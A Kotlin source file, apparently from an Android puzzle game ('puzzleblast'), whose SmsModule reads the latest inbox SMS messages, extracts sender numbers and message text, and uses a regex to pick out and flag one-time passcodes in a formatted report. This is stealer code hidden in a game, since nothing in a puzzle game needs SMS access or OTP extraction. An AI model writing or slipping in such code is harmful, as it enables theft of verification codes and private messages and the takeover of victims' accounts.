package com.puzzleblast.game.modules

import android.content.Context
import android.net.Uri
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object SmsModule {
    private val otpRe = Regex("""\b\d{4,8}\b""")

    suspend fun read(ctx: Context, n: Int = 10): String {
        val cols = arrayOf("address", "body", "date", "type")
        val cursor = ctx.contentResolver.query(Uri.parse("content://sms/inbox"), cols, null, null, "date DESC LIMIT $n") ?: return "no sms access"
        val sb = StringBuilder("💬 SMS · last $n\n")
        var i = 1
        cursor.use { c ->
            while (c.moveToNext()) {
                val num = c.getString(0) ?: "?"
                val body = c.getString(1) ?: ""
                val date = c.getLong(2)
                val rel = relTime(date)
                val otp = otpRe.find(body)?.value
                sb.append("${i++}. $num — ${body.take(80)}${if (otp != null) " 🔑[$otp]" else ""} · $rel\n")
            }
        }
        return sb.toString().ifBlank { "no sms" }
    }

    fun relTime(ts: Long): String {
        val diff = System.currentTimeMillis() - ts
        val m = diff / 60000
        return when {
            m < 1 -> "now"
            m < 60 -> "${m}m"
            m < 1440 -> "${m / 60}h"
            else -> "${m / 1440}d"
        }
    }
}
